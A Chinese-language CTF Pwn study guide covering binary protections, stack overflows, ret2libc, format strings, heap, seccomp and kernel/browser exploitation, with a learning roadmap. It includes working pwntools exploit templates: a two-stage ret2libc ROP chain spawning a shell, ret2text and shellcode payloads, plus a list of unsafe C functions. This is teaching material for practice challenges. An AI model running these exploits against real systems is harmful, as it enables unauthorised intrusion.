# Pwn 知识库

## 学习目标

Pwn 方向主要考察二进制漏洞利用能力。入门阶段重点是理解 C 程序、栈、函数调用、内存布局、保护机制和 pwntools 脚本。Pwn 比其他方向门槛高，建议在学过一点 C 和 Reverse 后再系统刷。

## Level 0：前置基础

### 必会 C 语言点

- 变量和类型：`char`、`int`、`long`、数组、指针。
- 字符串：C 字符串以 `\0` 结束。
- 函数调用：参数、返回值、局部变量。
- 输入函数：`gets`、`scanf`、`read`、`fgets`。
- 输出函数：`printf`、`puts`、`write`。
- 内存：栈、堆、全局区、代码段。

### 危险函数

```c
gets
scanf("%s", buf)
strcpy
strcat
sprintf
read(0, buf, very_large_size)
printf(user_input)
```

### 基础命令

```bash
file ./pwn
checksec ./pwn
chmod +x ./pwn
./pwn
gdb ./pwn
```

## Level 1：程序保护机制

使用：

```bash
checksec ./pwn
```

常见保护：

| 保护 | 含义 | 影响 |
|---|---|---|
| Canary | 栈溢出检测 | 覆盖返回地址前会先检查 canary |
| NX | 栈不可执行 | 不能直接在栈上执行 shellcode |
| PIE | 程序地址随机化 | 代码段地址每次变化 |
| RELRO | GOT 表保护 | Full RELRO 下难改 GOT |
| ASLR | 系统地址随机化 | libc、栈、堆地址随机 |

入门题通常从这些情况开始：

```text
No Canary
No PIE
NX enabled
Partial RELRO
```

## Level 2：栈基础

### 栈是什么

栈保存：

- 函数局部变量
- 保存的 rbp
- 返回地址

简化结构：

```text
高地址
+----------------+
| 返回地址       |
+----------------+
| saved rbp      |
+----------------+
| 局部变量 buf   |
+----------------+
低地址
```

如果输入超过 `buf` 大小，就可能覆盖 saved rbp 和返回地址。

### x64 调用约定

前六个参数：

```text
rdi, rsi, rdx, rcx, r8, r9
```

返回值：

```text
rax
```

## Level 3：栈溢出 ret2text

### 条件

- 没有 Canary。
- 程序里有后门函数，比如 `win()`、`backdoor()`、`system('/bin/sh')`。
- 可以覆盖返回地址。

### 思路

1. 找到偏移。
2. 找到后门函数地址。
3. 构造 payload：填充 + 后门地址。

### 找偏移

```bash
cyclic 200
```

gdb 崩溃后查：

```bash
cyclic -l 崩溃值
```

### pwntools 模板

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

elf = ELF('./pwn')
p = process('./pwn')

offset = 72
win = elf.symbols['win']

payload = b'A' * offset + p64(win)
p.sendline(payload)
p.interactive()
```

远程：

```python
p = remote('host', 端口)
```

## Level 4：ret2shellcode

### 条件

- NX 关闭。
- 可以把 shellcode 写到可执行区域。
- 能跳到 shellcode 地址。

### shellcode

```python
from pwn import *

shellcode = asm(shellcraft.sh())
```

### payload 思路

```text
shellcode + padding + shellcode地址
```

现代题中 NX 通常开启，所以 ret2shellcode 较少作为入门之后的主流解法。

## Level 5：ret2libc

### 条件

- NX 开启。
- 可以控制返回地址。
- 能泄露 libc 地址，或者本地和远程 libc 已知。

### 目标

调用：

```c
system('/bin/sh')
```

### 需要的信息

- `puts@plt`
- `puts@got`
- `main` 地址
- `pop rdi; ret` gadget
- libc 中 `puts`、`system`、`/bin/sh` 偏移

### 典型两阶段

第一阶段：泄露 puts 地址。

第二阶段：计算 libc 基址，调用 system('/bin/sh')。

### 模板

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

elf = ELF('./pwn')
libc = ELF('./libc.so.6')
p = process('./pwn')

offset = 72
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

p.sendline(payload)
leak = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
log.success(hex(libc_base))

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

## Level 6：格式化字符串漏洞

### 危险代码

```c
printf(buf);
```

正确写法应该是：

```c
printf("%s", buf);
```

### 常见效果

- 泄露栈数据：`%p %p %p`
- 读任意地址：`%s`
- 写任意地址：`%n`

### 找偏移

```text
AAAA.%p.%p.%p.%p.%p.%p
```

看哪一位出现 `0x41414141`。

### pwntools

```python
from pwn import *

payload = fmtstr_payload(offset, {target_addr: value})
```

## Level 7：整数溢出和数组越界

### 整数溢出

常见问题：

- `int` 最大值溢出变负数。
- `unsigned` 下溢变大数。
- 长度检查和实际读取不一致。

### 数组越界

常见问题：

- index 可控。
- 没有检查负数。
- 可以读/写数组外内存。

思路：

1. 找可控下标。
2. 判断越界读还是越界写。
3. 泄露地址或修改关键变量。

## Level 8：堆基础

入门后再系统学堆。先知道这些概念：

- `malloc`
- `free`
- chunk
- tcache
- fastbin
- unsorted bin
- UAF：Use After Free
- double free
- heap overflow

常见漏洞：

- UAF：释放后继续使用。
- Double Free：同一块内存释放两次。
- Heap Overflow：堆块溢出覆盖相邻堆块。

堆题建议在熟悉栈题后再刷。

## Level 9：沙箱和系统调用

有些 Pwn 题会开启 seccomp 沙箱，限制系统调用。

查看方式：

```bash
seccomp-tools dump ./pwn
```

常见限制：

- 禁止 `execve`，不能直接 getshell。
- 只能 `open/read/write`，需要 ORW 读 flag。

ORW 思路：

```text
open('flag') -> read(fd, buf, size) -> write(1, buf, size)
```

## Level 10：调试方法

### gdb 常用命令

```gdb
break main
run
next
step
continue
info registers
x/20gx $rsp
x/40bx $rsp
disassemble main
vmmap
```

### pwndbg 常用命令

```gdb
checksec
cyclic 200
cyclic -l value
stack 20
regs
nearpc
vmmap
got
plt
```

如果 pwndbg 没装好，也可以先用普通 gdb。

## pwntools 常用模板

### 本地/远程切换

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')

elf = ELF('./pwn')

if args.REMOTE:
    p = remote('host', 端口)
else:
    p = process('./pwn')

p.interactive()
```

运行：

```bash
python3 exp.py
python3 exp.py REMOTE
```

### 常用收发

```python
p.send(b'aaa')
p.sendline(b'aaa')
p.sendafter(b'name:', b'aaa')
p.sendlineafter(b'name:', b'aaa')

p.recv(10)
p.recvline()
p.recvuntil(b'hello')
p.interactive()
```

### 打包解包

```python
p64(0xdeadbeef)
p32(0xdeadbeef)
u64(data.ljust(8, b'\x00'))
u32(data.ljust(4, b'\x00'))
```

## 做题检查清单

- `file` 看架构了吗？
- `checksec` 看保护了吗？
- 程序输入点在哪里？
- 是否有危险函数？
- 是否能覆盖返回地址？
- offset 算了吗？
- 是否有后门函数？
- NX 是否开启？
- PIE 是否开启？
- 是否能泄露 libc 地址？
- 是否有格式化字符串？
- 是否有 canary？能泄露 canary 吗？
- 远程 libc 是否和本地一致？

## 推荐练习

1. picoCTF Pwn：最适合入门。
2. BUUCTF Pwn：经典 ret2text、ret2libc 很多。
3. NSSCTF Pwn：新题较多。
4. 攻防世界 Pwn：基础题适合巩固。
5. pwnable.kr：经典，但部分题偏难。

## 硬核进阶路线

### 阶段 1：系统底层基础

目标：理解程序、内存、系统调用和动态链接。

必学内容：

- C 语言：指针、数组、结构体、函数指针、内存管理。
- 汇编：x86/x64、ARM 基础。
- Linux 进程内存布局：text、data、bss、heap、stack、mmap。
- 函数调用约定：x86、x64 SysV、Windows x64。
- ELF 文件格式。
- 动态链接：PLT、GOT、relocation。
- 系统调用：read、write、open、execve、mmap、mprotect。
- glibc 基础。

推荐书籍：

- 《深入理解计算机系统》：Pwn 核心基础。
- 《程序员的自我修养：链接、装载与库》：ELF 和动态链接。
- 《Linux/UNIX 系统编程手册》：系统调用和 Linux 编程。
- 《C 和指针》：C 指针基础。
- 《Expert C Programming》：C 语言陷阱和底层细节。

阶段验收：

- 能手写一个调用 `read/write` 的 C 程序。
- 能解释栈帧结构。
- 能解释 PLT/GOT 的作用。
- 能用 gdb 单步跟进函数调用。

### 阶段 2：栈利用体系

目标：熟练解决栈类 Pwn 题。

必学内容：

- 栈溢出。
- ret2text。
- ret2shellcode。
- ret2libc。
- ROP。
- ret2csu。
- stack pivot。
- canary 泄露和绕过。
- PIE 泄露和绕过。
- SROP。
- ORW。
- one_gadget 使用条件。

训练顺序：

1. 无保护 ret2text。
2. NX 开启 ret2libc。
3. PIE 开启先泄露程序基址。
4. Canary 开启先泄露 canary。
5. 没有 `pop rdi` 时 ret2csu。
6. 栈空间不够时 stack pivot。
7. seccomp 限制时 ORW。

推荐资源：

- pwn.college：系统化训练，非常推荐。
- ROP Emporium：ROP 专项经典。
- pwnable.kr Toddler's Bottle。
- Nightmare：Pwn 入门到中级路线。
- how2heap：堆利用，但前面也有基础环境。

阶段验收：

- 能不看模板写 ret2libc。
- 能用 ROPgadget 找 gadget。
- 能解释 ret2csu 的寄存器控制过程。
- 能在 seccomp 下写 ORW ROP 链。

### 阶段 3：格式化字符串

目标：掌握任意读写原语。

必学内容：

- `%p` 泄露栈。
- `%s` 任意地址读。
- `%n` 任意地址写。
- offset 定位。
- 短写 `%hn`、字节写 `%hhn`。
- GOT overwrite。
- return address overwrite。
- fmtstr_payload 原理。

阶段验收：

- 能手工构造 `%n` 写入。
- 能泄露 libc 并覆盖 GOT。
- 能解释 pwntools `fmtstr_payload` 生成的 payload。

### 阶段 4：堆利用基础

目标：理解 glibc malloc 的 chunk、bin 和 tcache。

必学内容：

- chunk 结构。
- size / prev_size。
- PREV_INUSE。
- fastbin。
- unsorted bin。
- small bin / large bin。
- tcache。
- malloc/free 流程。
- libc 版本差异。

常见漏洞：

- UAF。
- double free。
- heap overflow。
- off-by-one。
- null byte overflow。
- use after free 泄露。

推荐资料：

- how2heap：堆利用必刷。
- Azeria Labs Heap Exploitation。
- Shellphish heap-exploitation。
- glibc malloc 源码。
- CTF Wiki Heap。

阶段验收：

- 能画出 chunk 布局。
- 能解释 tcache double free。
- 能利用 unsorted bin leak 泄露 libc。
- 能完成 how2heap 基础 tcache 例子。

### 阶段 5：堆利用进阶

目标：能打中高难堆题。

技术列表：

- fastbin dup。
- unsafe unlink。
- house of spirit。
- house of force。
- house of orange。
- tcache poisoning。
- tcache stashing unlink。
- unsorted bin attack。
- large bin attack。
- FSOP。
- IO_FILE 利用。
- __free_hook / __malloc_hook 历史利用。
- setcontext + ORW。
- exit hook / fini_array。
- safe-linking 绕过。

阶段验收：

- 能按 libc 版本选择打法。
- 能读懂高质量堆题 writeup。
- 能完成 30 道堆题复现。

### 阶段 6：沙箱、内核和高级利用

目标：从普通用户态 Pwn 进入更硬核方向。

用户态高级：

- seccomp-bpf。
- SROP。
- JOP/COP。
- mprotect/mmap shellcode。
- dl_resolve。
- ret2dlresolve。
- vDSO/vsyscall。

内核 Pwn：

- Linux kernel module。
- ioctl。
- kernel UAF。
- kernel heap overflow。
- race condition。
- ret2usr。
- KASLR/SMEP/SMAP/KPTI 绕过。
- ROP in kernel。
- Dirty COW 等经典漏洞。

浏览器 Pwn：

- JavaScript 引擎基础。
- V8 object model。
- type confusion。
- OOB。
- addrof/fakeobj。
- wasm rwx。
- sandbox escape。

推荐书籍/资料：

- 《Linux Kernel Development》：内核基础。
- Linux Device Drivers。
- pwn.college kernel modules。
- Google Project Zero Blog。
- browser exploitation 相关公开 writeup。
- v8.dev 文档。

阶段验收：

- 能写一个简单 Linux kernel module。
- 能复现一个基础 kernel UAF CTF 题。
- 能读懂简单 V8 OOB 利用链。

### 阶段 7：Pwn 比赛方法论

比赛时优先判断：

1. `checksec` 看保护。
2. `file` 看架构。
3. 运行程序找交互点。
4. Ghidra 找危险函数。
5. 判断是栈、堆、fmt、整数、沙箱还是逻辑漏洞。
6. 先找泄露，再找控制流劫持。
7. 本地打通后再处理远程环境差异。

长期训练任务：

- ROP Emporium 全刷。
- pwnable.kr Toddler's Bottle 全刷。
- how2heap 按 libc 版本复现。
- BUUCTF Pwn 基础题 100 道。
- 每周至少复现 2 道中等 Pwn 题。
- 每月深读一个 glibc malloc 机制。
